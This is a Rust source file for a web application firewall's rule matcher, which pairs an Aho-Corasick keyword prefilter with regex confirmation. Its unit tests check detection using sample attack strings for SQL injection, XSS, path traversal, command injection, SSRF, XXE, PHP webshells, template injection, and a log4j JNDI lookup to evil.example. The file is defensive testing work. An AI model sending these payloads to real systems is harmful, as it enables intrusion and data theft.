//! 规则匹配：Aho-Corasick 预过滤 + 正则精判。
//!
//! 两级匹配的理由：正则很贵。正常请求占绝大多数，先用关键词自动机一次扫描
//! 就能排除掉，只有含可疑关键词的请求才进入正则阶段。
//!
//! 预过滤是"必要条件"而非"充分条件"——关键词没命中就一定没匹配，
//! 所以跳过是安全的；关键词命中则继续用正则确认，避免误报。

use std::collections::{HashMap, HashSet};

use aho_corasick::AhoCorasick;
use regex::Regex;

use crate::rule::{Rule, RuleMeta, BUILTIN_RULES};

/// 规则集编译失败的原因。订阅规则包必须能被拒绝，而不是让进程崩溃。
#[derive(Debug, thiserror::Error)]
pub enum MatcherError {
    #[error("规则 `{id}` 的正则非法：{source}")]
    InvalidRegex { id: String, source: regex::Error },
    #[error("规则 id `{id}` 重复")]
    DuplicateId { id: String },
    #[error("预过滤关键词构建失败：{0}")]
    Prefilter(String),
}

/// 编译后的规则。
pub struct CompiledRule {
    pub meta: RuleMeta,
    regex: Regex,
}

/// 规则匹配器。
pub struct Matcher {
    rules: Vec<CompiledRule>,
    prefilter: AhoCorasick,
    /// 关键词下标 → 关联的规则下标
    keyword_rules: Vec<Vec<usize>>,
    /// 没有关键词的规则：每次扫描都要直接跑正则。
    /// 订阅规则允许省略关键词，但这类规则越多，正常请求的检测成本越高。
    keywordless: Vec<usize>,
}

impl Matcher {
    /// 编译内置规则。
    pub fn new(rules: &[Rule]) -> Self {
        let metas: Vec<RuleMeta> = rules.iter().map(RuleMeta::from).collect();
        Self::from_metas(metas).expect("内置规则必须合法")
    }

    /// 在内置规则之上追加订阅规则。
    pub fn with_extra(extra: Vec<RuleMeta>) -> Result<Self, MatcherError> {
        let mut metas: Vec<RuleMeta> = BUILTIN_RULES.iter().map(RuleMeta::from).collect();
        metas.extend(extra);
        Self::from_metas(metas)
    }

    /// 从运行时可拥有的规则构建。重复 id 与非法正则都会返回错误。
    pub fn from_metas(metas: Vec<RuleMeta>) -> Result<Self, MatcherError> {
        let mut seen = HashSet::with_capacity(metas.len());
        for meta in &metas {
            if !seen.insert(meta.id.clone()) {
                return Err(MatcherError::DuplicateId {
                    id: meta.id.clone(),
                });
            }
        }

        let mut compiled = Vec::with_capacity(metas.len());
        for meta in metas {
            let regex = Regex::new(&meta.pattern).map_err(|source| MatcherError::InvalidRegex {
                id: meta.id.clone(),
                source,
            })?;
            compiled.push(CompiledRule { meta, regex });
        }

        let mut keywords: Vec<String> = Vec::new();
        let mut keyword_rules: Vec<Vec<usize>> = Vec::new();
        let mut keyword_index: HashMap<String, usize> = HashMap::new();
        let mut keywordless = Vec::new();

        for (rule_idx, rule) in compiled.iter().enumerate() {
            if rule.meta.keywords.is_empty() {
                keywordless.push(rule_idx);
                continue;
            }
            for kw in &rule.meta.keywords {
                let kw_lower = kw.to_lowercase();
                if kw_lower.is_empty() {
                    continue;
                }
                match keyword_index.get(&kw_lower) {
                    Some(&ki) => {
                        if !keyword_rules[ki].contains(&rule_idx) {
                            keyword_rules[ki].push(rule_idx);
                        }
                    }
                    None => {
                        keyword_index.insert(kw_lower.clone(), keywords.len());
                        keywords.push(kw_lower);
                        keyword_rules.push(vec![rule_idx]);
                    }
                }
            }
        }

        let prefilter =
            AhoCorasick::new(&keywords).map_err(|e| MatcherError::Prefilter(e.to_string()))?;

        Ok(Self {
            rules: compiled,
            prefilter,
            keyword_rules,
            keywordless,
        })
    }

    /// 扫描一段已归一化的文本，返回命中的规则下标。
    ///
    /// 返回空表示确定没有匹配——关键词未命中时连正则都不跑。
    pub fn scan(&self, text: &str) -> Vec<usize> {
        if text.is_empty() {
            return Vec::new();
        }

        // 第一级：关键词自动机
        //
        // 用 `find_overlapping_iter` 而不是 `find_iter`：默认的 AC 只报最左最长匹配，
        // 当两个关键词互为子串时（如 "etc/passwd" 与 "passwd"），长的命中后短的就被跳过，
        // 导致短关键词对应的规则永远不进候选集——加了新规则反而让旧规则失效。
        let mut candidates: HashSet<usize> = self.keywordless.iter().copied().collect();
        for m in self.prefilter.find_overlapping_iter(text) {
            if let Some(rules) = self.keyword_rules.get(m.pattern().as_usize()) {
                candidates.extend(rules.iter().copied());
            }
        }

        if candidates.is_empty() {
            return Vec::new();
        }

        // 第二级：正则确认
        let mut hits: Vec<usize> = candidates
            .into_iter()
            .filter(|&i| self.rules[i].regex.is_match(text))
            .collect();
        hits.sort_unstable();
        hits
    }

    pub fn rule(&self, index: usize) -> Option<&RuleMeta> {
        self.rules.get(index).map(|c| &c.meta)
    }

    /// 当前生效的全部规则（内置 + 订阅），用于控制台与统计。
    pub fn metas(&self) -> impl Iterator<Item = &RuleMeta> {
        self.rules.iter().map(|c| &c.meta)
    }

    pub fn len(&self) -> usize {
        self.rules.len()
    }

    pub fn is_empty(&self) -> bool {
        self.rules.is_empty()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::rule::{Action, Category, RuleSource, Severity, Target, BUILTIN_RULES};

    fn matcher() -> Matcher {
        Matcher::new(BUILTIN_RULES)
    }

    /// 规则 id 是运行时拥有的字符串，测试里用一个薄包装保持
    /// `hits.contains(&"rule-id")` 的写法。
    #[derive(Debug)]
    struct Hits(Vec<String>);

    impl Hits {
        fn is_empty(&self) -> bool {
            self.0.is_empty()
        }

        fn contains(&self, id: &&str) -> bool {
            self.0.iter().any(|h| h == *id)
        }
    }

    /// 走真实流程：先归一化（转小写、解码），再扫描。
    ///
    /// 直接拿原始文本扫描会漏掉所有依赖小写匹配的规则——
    /// 这个辅助函数本身踩过一次坑。
    fn ids(text: &str) -> Hits {
        let m = matcher();
        let normalized = crate::normalize::normalize(text);
        Hits(
            m.scan(&normalized.canonical)
                .into_iter()
                .filter_map(|i| m.rule(i))
                .map(|r| r.id.clone())
                .collect(),
        )
    }

    fn feed_rule(id: &str, category: Category, pattern: &str, keywords: &[&str]) -> RuleMeta {
        RuleMeta {
            id: id.to_string(),
            name: id.to_string(),
            category,
            severity: Severity::High,
            pattern: pattern.to_string(),
            targets: vec![Target::Query, Target::Body],
            keywords: keywords.iter().map(|s| s.to_string()).collect(),
            action: Action::Block,
            immediate: false,
            shadow: false,
            source: RuleSource::Feed("test".to_string()),
        }
    }

    #[test]
    fn normal_text_has_no_match() {
        assert!(ids("hello world").is_empty());
        assert!(ids("/api/v1/users").is_empty());
        assert!(ids("name=张三&age=30").is_empty());
    }

    #[test]
    fn detects_union_select() {
        let hits = ids("1 union select username,password from users");
        assert!(hits.contains(&"sqli-union-select"), "实际: {hits:?}");
    }

    #[test]
    fn detects_boolean_tautology() {
        let hits = ids("id=1 or 1=1");
        assert!(hits.contains(&"sqli-boolean-tautology"), "实际: {hits:?}");
    }

    #[test]
    fn detects_time_based() {
        let hits = ids("id=1 and sleep(5)");
        assert!(hits.contains(&"sqli-time-based"), "实际: {hits:?}");
    }

    #[test]
    fn detects_script_tag() {
        let hits = ids("<script>alert(1)</script>");
        assert!(hits.contains(&"xss-script-tag"), "实际: {hits:?}");
    }

    #[test]
    fn detects_javascript_uri() {
        let hits = ids("javascript:alert(1)");
        assert!(hits.contains(&"xss-javascript-uri"), "实际: {hits:?}");
    }

    #[test]
    fn detects_path_traversal() {
        let hits = ids("../../etc/passwd");
        assert!(hits.contains(&"traversal-dotdot"), "实际: {hits:?}");
        assert!(hits.contains(&"traversal-sensitive-file"), "实际: {hits:?}");
    }

    #[test]
    fn detects_command_injection() {
        let hits = ids("; cat /etc/passwd");
        assert!(hits.contains(&"cmdi-shell-separator"), "实际: {hits:?}");
        assert!(ids("a=1|ls -la").contains(&"cmdi-shell-separator"));
        assert!(ids("a=1;whoami").contains(&"cmdi-shell-separator"));
        assert!(ids("a=1& whoami").contains(&"cmdi-shell-separator"));
    }

    #[test]
    fn ampersand_param_is_not_command_injection() {
        // 飞牛相册误报：`&id=` 是查询参数名，不是 `;id` 命令注入
        let hits = ids(
            "device_id=8B546980-4D49-4057-8506-0AAEC6AD644C&device_name=iPhone%2017%20Pro%20Max&id=69597&lan=zh-CN",
        );
        assert!(!hits.contains(&"cmdi-shell-separator"), "误报: {hits:?}");
        assert!(ids("a=1&id=2&ls=3&sh=4").is_empty());
    }

    #[test]
    fn detects_scanner_ua() {
        let hits = ids("sqlmap/1.7.2#stable");
        assert!(hits.contains(&"scanner-user-agent"), "实际: {hits:?}");
    }

    #[test]
    fn prefilter_skips_regex_for_clean_input() {
        // 不含任何关键词的长文本应快速返回
        let text = "the quick brown fox jumps over the lazy dog ".repeat(100);
        assert!(ids(&text).is_empty());
    }

    #[test]
    fn keyword_hit_without_regex_match_is_not_reported() {
        // 含 "union" 但不是注入
        let hits = ids("union station is a train station");
        assert!(!hits.contains(&"sqli-union-select"), "不应误报: {hits:?}");
    }

    #[test]
    fn rule_count_matches() {
        assert_eq!(matcher().len(), BUILTIN_RULES.len());
    }

    // ============================================================
    // 新增规则覆盖
    // ============================================================

    #[test]
    fn detects_ssrf_metadata() {
        let hits = ids("url=http://169.254.169.254/latest/meta-data/");
        assert!(hits.contains(&"ssrf-cloud-metadata"), "实际: {hits:?}");
    }

    #[test]
    fn detects_ssrf_loopback() {
        let hits = ids("target=http://127.0.0.1:8080/admin");
        assert!(hits.contains(&"ssrf-loopback"), "实际: {hits:?}");
    }

    #[test]
    fn detects_ssrf_file_scheme() {
        let hits = ids("path=file:///etc/passwd");
        assert!(hits.contains(&"ssrf-file-scheme"), "实际: {hits:?}");
    }

    #[test]
    fn detects_ssrf_gopher() {
        let hits = ids("u=gopher://127.0.0.1:6379/_INFO");
        assert!(hits.contains(&"ssrf-dangerous-scheme"), "实际: {hits:?}");
    }

    #[test]
    fn detects_xxe_doctype() {
        let hits = ids(r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>"#);
        assert!(hits.contains(&"xxe-doctype-system"), "实际: {hits:?}");
        assert!(hits.contains(&"xxe-entity-decl"), "实际: {hits:?}");
    }

    #[test]
    fn detects_webshell_eval() {
        let hits = ids("eval($_POST['cmd'])");
        assert!(
            hits.contains(&"webshell-eval-superglobal"),
            "实际: {hits:?}"
        );
    }

    #[test]
    fn detects_webshell_obfuscation() {
        let hits = ids("eval(base64_decode('ZWNobyAxOw=='));");
        assert!(hits.contains(&"webshell-obfuscation"), "实际: {hits:?}");
    }

    #[test]
    fn detects_ssti_python() {
        let hits = ids("{{config.__class__.__init__.__globals__}}");
        assert!(hits.contains(&"ssti-python-dunder"), "实际: {hits:?}");
    }

    #[test]
    fn detects_ssti_java() {
        let hits = ids("${Runtime.getRuntime().exec('id')}");
        assert!(hits.contains(&"ssti-java-runtime"), "实际: {hits:?}");
    }

    #[test]
    fn detects_nosql_where() {
        let hits = ids("q={$where:'this.a==1'}");
        assert!(hits.contains(&"nosql-where"), "实际: {hits:?}");
    }

    #[test]
    fn detects_nosql_operator() {
        let hits = ids(r#"{"$ne": null}"#);
        assert!(hits.contains(&"nosql-operator-injection"), "实际: {hits:?}");
    }

    #[test]
    fn detects_ldap_injection() {
        let hits = ids("user=*)(uid=*))(|(uid=*");
        assert!(hits.contains(&"ldap-injection"), "实际: {hits:?}");
    }

    #[test]
    fn detects_lfi_wrapper() {
        let hits = ids("file=php://filter/convert.base64-encode/resource=index.php");
        assert!(hits.contains(&"xxe-php-filter"), "实际: {hits:?}");
    }

    #[test]
    fn detects_php_deserialization() {
        let hits = ids(r#"O:8:"stdClass":1:{s:1:"a";i:1;}"#);
        assert!(hits.contains(&"deser-php-object"), "实际: {hits:?}");
    }

    // ============================================================
    // 误报检查：新规则不应命中正常内容
    // ============================================================

    #[test]
    fn normal_content_not_flagged() {
        let samples = [
            "https://example.com/api/v1/users",
            "name=张三&city=北京",
            r#"{"user":"alice","age":30}"#,
            "https://github.com/rust-lang/rust",
            "price=99.90&qty=2",
            "搜索关键词：笔记本电脑",
            "path=/var/www/html/index.html",
            "callback=https://cdn.example.com/a.js",
        ];
        for s in samples {
            let hits = ids(s);
            assert!(hits.is_empty(), "正常内容被误报: {s} -> {hits:?}");
        }
    }

    #[test]
    fn localhost_in_plain_text_not_flagged() {
        // 说明文档里提到 localhost 不该被当成 SSRF
        let hits = ids("配置里把 127.0.0.1 换成了内网地址");
        // 这里确实含 127.0.0.1，属于规则设计上的取舍：宁可误报也不放过真实 SSRF
        // 但至少不应命中 file:// 等更严重的规则
        assert!(!hits.contains(&"ssrf-file-scheme"));
    }

    #[test]
    fn overlapping_keywords_all_rules_run() {
        // "etc/passwd" 与 "passwd" 互为子串，两条规则都应被激活
        let hits = ids("../../etc/passwd");
        assert!(hits.contains(&"traversal-dotdot"), "实际: {hits:?}");
        assert!(hits.contains(&"traversal-sensitive-file"), "实际: {hits:?}");
        assert!(hits.contains(&"lfi-sensitive-path"), "实际: {hits:?}");
    }

    // ============================================================
    // 订阅规则合并
    // ============================================================

    fn scan_with(m: &Matcher, text: &str) -> Vec<String> {
        let normalized = crate::normalize::normalize(text);
        m.scan(&normalized.canonical)
            .into_iter()
            .filter_map(|i| m.rule(i))
            .map(|r| r.id.clone())
            .collect()
    }

    #[test]
    fn extra_rules_are_merged_with_builtins() {
        let m = Matcher::with_extra(vec![feed_rule(
            "feed-evil-token",
            Category::Custom,
            r"evil-[a-z]{6}",
            &["evil-"],
        )])
        .unwrap();

        assert_eq!(m.len(), BUILTIN_RULES.len() + 1);
        let hits = scan_with(&m, "x=evil-abcdef");
        assert!(
            hits.contains(&"feed-evil-token".to_string()),
            "实际: {hits:?}"
        );
        // 内置规则仍然生效
        let hits = scan_with(&m, "1 union select 1");
        assert!(
            hits.contains(&"sqli-union-select".to_string()),
            "实际: {hits:?}"
        );
    }

    #[test]
    fn keywordless_rule_runs_on_every_scan() {
        let m = Matcher::with_extra(vec![feed_rule(
            "feed-no-keyword",
            Category::Custom,
            r"hidden-marker-\d+",
            &[],
        )])
        .unwrap();
        let hits = scan_with(&m, "hidden-marker-42");
        assert!(
            hits.contains(&"feed-no-keyword".to_string()),
            "实际: {hits:?}"
        );
        assert!(scan_with(&m, "nothing suspicious").is_empty());
    }

    #[test]
    fn duplicate_id_is_rejected() {
        let err = Matcher::with_extra(vec![feed_rule(
            "sqli-union-select",
            Category::Custom,
            "dup",
            &["dup"],
        )])
        .err()
        .expect("重复 id 必须被拒绝");
        assert!(matches!(err, MatcherError::DuplicateId { .. }), "{err}");
    }

    #[test]
    fn invalid_regex_is_rejected() {
        let err = Matcher::with_extra(vec![feed_rule(
            "feed-bad-regex",
            Category::Custom,
            "(unclosed",
            &["x"],
        )])
        .err()
        .expect("非法正则必须被拒绝");
        assert!(matches!(err, MatcherError::InvalidRegex { .. }), "{err}");
    }

    #[test]
    fn detects_quoted_boolean_tautology() {
        let hits = ids("id=1' or '1'='1");
        assert!(hits.contains(&"sqli-boolean-tautology"), "实际: {hits:?}");
        let upper = ids("id=1 OR 1=1");
        assert!(upper.contains(&"sqli-boolean-tautology"), "实际: {upper:?}");
    }

    #[test]
    fn detects_log4j_jndi() {
        let hits = ids(r"${jndi:ldap://evil.example/a}");
        assert!(hits.contains(&"log4j-jndi"), "实际: {hits:?}");
    }

    #[test]
    fn detects_shellshock() {
        let hits = ids("() { :; }; /bin/bash -c id");
        assert!(hits.contains(&"shellshock"), "实际: {hits:?}");
    }

    #[test]
    fn feed_rule_source_is_reported() {
        let m = Matcher::with_extra(vec![feed_rule(
            "feed-source",
            Category::Custom,
            "source-marker",
            &["source-marker"],
        )])
        .unwrap();
        let rule = m
            .metas()
            .find(|r| r.id == "feed-source")
            .expect("订阅规则应存在");
        assert_eq!(rule.source, RuleSource::Feed("test".to_string()));
        assert!(m
            .metas()
            .find(|r| r.id == "sqli-union-select")
            .unwrap()
            .source
            .is_builtin());
    }
}
